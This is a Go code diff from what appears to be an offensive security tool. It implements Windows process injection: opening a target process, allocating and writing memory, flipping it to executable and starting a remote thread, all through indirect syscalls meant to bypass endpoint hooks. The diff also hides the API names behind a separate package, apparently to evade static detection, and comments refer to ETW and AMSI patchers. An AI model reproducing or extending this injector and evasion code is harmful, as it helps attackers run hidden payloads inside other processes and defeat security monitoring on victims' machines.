@@ -22,6 +22,8 @@ import (
 	"unsafe"
 
 	"golang.org/x/sys/windows"
+
+	"github.com/DevCop95/obliteratus/internal/winname"
 )
 
 // EnergyFlow executes one indirect syscall: it loads the System Service
@@ -34,17 +36,15 @@ import (
 func EnergyFlow(a1 uintptr, id uint32, ep uintptr, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uint32
 
 var (
-	kernel32        = windows.NewLazySystemDLL("kernel32.dll")
-	ntdll           = windows.NewLazySystemDLL("ntdll.dll")
-	procOpenProcess = kernel32.NewProc("OpenProcess")
-	procCloseHandle = kernel32.NewProc("CloseHandle")
+	procOpenProcess = kernel32.NewProc(winname.OpenProc)
+	procCloseHandle = kernel32.NewProc(winname.CloseH)
 )
 
 const (
 	processAllAccess = 0x1F0FFF
 	memCommitReserve = 0x3000 // MEM_COMMIT | MEM_RESERVE
-	pageReadWrite    = 0x04   // no RWX page ever exists (W^X)
-	pageExecuteRead  = 0x20
+	// pageReadWrite / pageExecuteRead live in dll_windows.go (shared with the
+	// ETW and AMSI patchers); no RWX page ever exists (W^X).
 )
 
 // resolved is a System Service Number plus the address of a usable
@@ -130,30 +130,30 @@ func Inject(pid int, payload []byte) error {
 		return errors.New("inject: empty payload")
 	}
 
-	alloc, err := resolve("NtAllocateVirtualMemory")
+	alloc, err := resolve(winname.NtAllocVM)
 	if err != nil {
 		return err
 	}
-	write, err := resolve("NtWriteVirtualMemory")
+	write, err := resolve(winname.NtWriteVM)
 	if err != nil {
 		return err
 	}
-	protect, err := resolve("NtProtectVirtualMemory")
+	protect, err := resolve(winname.NtProtectVM)
 	if err != nil {
 		return err
 	}
-	createThread, err := resolve("NtCreateThreadEx")
+	createThread, err := resolve(winname.NtCreateTh)
 	if err != nil {
 		return err
 	}
-	closeHandle, err := resolve("NtClose")
+	closeHandle, err := resolve(winname.NtClose)
 	if err != nil {
 		return err
 	}
 
 	proc, _, callErr := procOpenProcess.Call(processAllAccess, 0, uintptr(pid))
 	if proc == 0 {
-		return fmt.Errorf("inject: OpenProcess(%d) failed: %v", pid, callErr)
+		return fmt.Errorf("inject: %s(%d) failed: %v", winname.OpenProc, pid, callErr)
 	}
 	defer procCloseHandle.Call(proc)
 
@@ -164,7 +164,7 @@ func Inject(pid int, payload []byte) error {
 		uintptr(unsafe.Pointer(&base)), 0,
 		uintptr(unsafe.Pointer(&size)), memCommitReserve, pageReadWrite,
 		0, 0, 0, 0, 0)
-	if err := ntdllStatus("NtAllocateVirtualMemory", st); err != nil {
+	if err := ntdllStatus(winname.NtAllocVM, st); err != nil {
 		return err
 	}
 	if base == 0 {
@@ -175,7 +175,7 @@ func Inject(pid int, payload []byte) error {
 	st = EnergyFlow(proc, write.id, write.addr,
 		base, uintptr(unsafe.Pointer(&payload[0])), size,
 		0, 0, 0, 0, 0, 0, 0)
-	if err := ntdllStatus("NtWriteVirtualMemory", st); err != nil {
+	if err := ntdllStatus(winname.NtWriteVM, st); err != nil {
 		EnergyFlow(proc, closeHandle.id, closeHandle.addr, proc, 0, 0, 0, 0, 0, 0, 0, 0, 0)
 		return err
 	}
@@ -186,7 +186,7 @@ func Inject(pid int, payload []byte) error {
 		uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&size)),
 		pageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)),
 		0, 0, 0, 0, 0, 0)
-	if err := ntdllStatus("NtProtectVirtualMemory", st); err != nil {
+	if err := ntdllStatus(winname.NtProtectVM, st); err != nil {
 		return err
 	}
 
@@ -195,7 +195,7 @@ func Inject(pid int, payload []byte) error {
 	st = EnergyFlow(uintptr(unsafe.Pointer(&thread)), createThread.id, createThread.addr,
 		processAllAccess, 0, proc, base,
 		0, 0, 0, 0, 0, 0)
-	if err := ntdllStatus("NtCreateThreadEx", st); err != nil {
+	if err := ntdllStatus(winname.NtCreateTh, st); err != nil {
 		return err
 	}
 	if thread != 0 {
